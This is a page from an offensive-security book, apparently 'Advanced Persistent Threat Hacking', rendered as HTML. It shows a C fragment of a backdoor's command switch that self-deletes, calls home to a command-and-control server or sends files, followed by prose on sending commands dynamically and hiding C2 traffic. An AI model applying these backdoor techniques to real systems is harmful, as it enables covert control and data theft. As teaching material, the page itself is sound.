<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1ab" class="pf w2 h2" data-page-no="1ab"><div class="pc pc1ab w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">404<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h44 yb3f fff fse fc0 sc0 ls0 ws0">–-- SNIP –--</div><div class="t m0 x3 h44 y264d fff fse fc0 sc0 ls0 ws0">int commandInt = 0;</div><div class="t m0 x3 h44 y1ba0 fff fse fc0 sc0 ls0 ws0">commandInt = atoi( responseBuf );</div><div class="t m0 x3 h44 y264e fff fse fc0 sc0 ls0 ws0">switch ( commandInt )</div><div class="t m0 x3 h44 y264f fff fse fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h44 y1ba4 fff fse fc0 sc0 ls0 ws0">   case ABOLISH_SELF :</div><div class="t m0 x3 h44 y2650 fff fse fc0 sc0 ls0 ws0">        SelfDelete();</div><div class="t m0 x3 h44 y2651 fff fse fc0 sc0 ls0 ws0">        ExitProcess(1);</div><div class="t m0 x3 h44 y2652 fff fse fc0 sc0 ls0 ws0">        return 1;</div><div class="t m0 x3 h44 y1daf fff fse fc0 sc0 ls0 ws0">   break;</div><div class="t m0 x3 h44 y2653 fff fse fc0 sc0 ls0 ws0">   case CALL_HOME :</div><div class="t m0 x3 h44 y2654 fff fse fc0 sc0 ls0 ws0">        callHome();</div><div class="t m0 x3 h44 y2655 fff fse fc0 sc0 ls0 ws0">   break;</div><div class="t m0 x3 h44 y2656 fff fse fc0 sc0 ls0 ws0">   case SEND_FILES :</div><div class="t m0 x3 h44 y2657 fff fse fc0 sc0 ls0 ws0">        sendFiles();</div><div class="t m0 x3 h44 y2658 fff fse fc0 sc0 ls0 ws0">   break;</div><div class="t m0 x3 h44 y2659 fff fse fc0 sc0 ls0 ws0">   default :</div><div class="t m0 x3 h44 y265a fff fse fc0 sc0 ls0 ws0">        //printf("nothing in switch\n");</div><div class="t m0 x3 h44 y265b fff fse fc0 sc0 ls0 ws0">    break;</div><div class="t m0 x3 h44 y265c fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x4 hd y265d ff4 fs7 fc0 sc0 ls0 ws0">The actions we’<span class="_ _2"/>re taking are somewhat irrele<span class="_ _0"/>vant here; we’<span class="_ _2"/>re simply sho<span class="_ _0"/>wing how </div><div class="t m0 x3 hd y265e ff4 fs7 fc0 sc0 ls0 ws0">we can call a specic function based on the answer from the server<span class="_ _2"/>. If we need to </div><div class="t m0 x3 hd y265f ff4 fs7 fc0 sc0 ls0 ws0">perform some<span class="_ _0"/>what dynamic actions, we’ll ha<span class="_ _0"/>ve to slightly modify this approach so </div><div class="t m0 x3 hd y2660 ff4 fs7 fc0 sc0 ls0 ws0">that the server can also send the necessary information to the backdoor<span class="_ _2"/>.</div><div class="t m0 x4 hd y2661 ff4 fs7 fc0 sc0 ls0 ws0">For e<span class="_ _0"/>xample, in the pre<span class="_ _0"/>vious example, the callHome function is most likely </div><div class="t m0 x3 hd y2662 ff4 fs7 fc0 sc0 ls0 ws0">hard-coded to connect back to a specic IP address (as the function does not take a </div><div class="t m0 x3 hd y2663 ff4 fs7 fc0 sc0 ls0 ws0">v<span class="_ _0"/>ariable) or DNS name. Howe<span class="_ _0"/>v<span class="_ _0"/>er<span class="_ _0"/>, if we want the C2 serv<span class="_ _0"/>er to instruct the backdoor </div><div class="t m0 x3 hd y2664 ff4 fs7 fc0 sc0 ls0 ws0">to connect to a specic IP address that is not hard-coded, then we’ll ha<span class="_ _0"/>ve to change </div><div class="t m0 x3 hd y2665 ff4 fs7 fc0 sc0 ls0 ws0">our function and method a little to pass this information with the command.</div><div class="t m0 x3 h7 y2666 ff1 fs3 fc0 sc0 ls0 ws0">Command and Control: Obscured Communication</div><div class="t m0 x3 hd y2667 ff4 fs7 fc0 sc0 ls0 ws0">Of course, sending hard-coded commands is easy<span class="_ _2"/>, and might be appropriate if our </div><div class="t m0 x3 hd y2668 ff4 fs7 fc0 sc0 ls0 ws0">communications are encrypted. Ho<span class="_ _0"/>wev<span class="_ _0"/>er<span class="_ _0"/>, if we need to send our C2 communications </div><div class="t m0 x3 hd y2669 ff4 fs7 fc0 sc0 ls0 ws0">unencrypted and hide in plain sight, then we’ll want to come up with a dif<span class="_ _0"/>ferent </div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>